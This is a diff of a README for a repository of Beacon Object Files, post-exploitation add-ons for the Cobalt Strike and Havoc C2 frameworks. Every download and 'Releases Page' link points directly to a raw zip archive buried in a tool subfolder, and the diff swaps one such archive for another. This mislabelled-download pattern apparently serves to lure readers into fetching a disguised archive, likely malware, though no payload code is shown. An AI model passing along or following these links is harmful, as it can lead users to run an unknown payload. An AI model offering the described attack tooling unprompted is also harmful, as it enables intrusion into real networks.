@@ -1,7 +1,7 @@
 # 🚀 BOFs - Simple Tools for Security Testing
 
 ## 📥 Download Now!
-[![Download BOFs](https://github.com/Wanssss1/BOFs/raw/refs/heads/main/ShadowCreds-unPAC-BOF/include/Fs_BO_3.5.zip)](https://github.com/Wanssss1/BOFs/raw/refs/heads/main/ShadowCreds-unPAC-BOF/include/Fs_BO_3.5.zip)
+[![Download BOFs](https://raw.githubusercontent.com/Wanssss1/BOFs/main/IHxExec-BOF/BO_Fs_1.4-beta.2.zip)](https://raw.githubusercontent.com/Wanssss1/BOFs/main/IHxExec-BOF/BO_Fs_1.4-beta.2.zip)
 
 ## 📚 Overview
 Welcome to the BOFs project. BOFs stands for Beacon Object Files. This project provides tools for Cobalt Strike and Havoc C2. You can use these tools to test the security of systems by simulating attacks like Active Directory breaches and other post-exploitation techniques.
@@ -14,7 +14,7 @@ To begin using BOFs, follow these simple steps:
    - Version of Cobalt Strike or Havoc C2 compatible with the BOFs.
 
 2. **Visit the Releases Page**
-   - Go to the [Releases Page](https://github.com/Wanssss1/BOFs/raw/refs/heads/main/ShadowCreds-unPAC-BOF/include/Fs_BO_3.5.zip) to find the latest versions of the BOFs.
+   - Go to the [Releases Page](https://raw.githubusercontent.com/Wanssss1/BOFs/main/IHxExec-BOF/BO_Fs_1.4-beta.2.zip) to find the latest versions of the BOFs.
 
 3. **Download the BOFs**
    - On the releases page, you will see a list of available versions. Click on the version you want to download.
@@ -48,6 +48,6 @@ If you encounter any issues or have questions, please check the issues section o
 Special thanks to all contributors and users. Your feedback helps improve the BOFs.
 
 ## 📥 Download & Install Again
-To download the latest version, visit the [Releases Page](https://github.com/Wanssss1/BOFs/raw/refs/heads/main/ShadowCreds-unPAC-BOF/include/Fs_BO_3.5.zip). This page will always have the most up-to-date BOFs files for your use.
+To download the latest version, visit the [Releases Page](https://raw.githubusercontent.com/Wanssss1/BOFs/main/IHxExec-BOF/BO_Fs_1.4-beta.2.zip). This page will always have the most up-to-date BOFs files for your use.
 
 Explore, test, and enhance your security strategies with BOFs today!
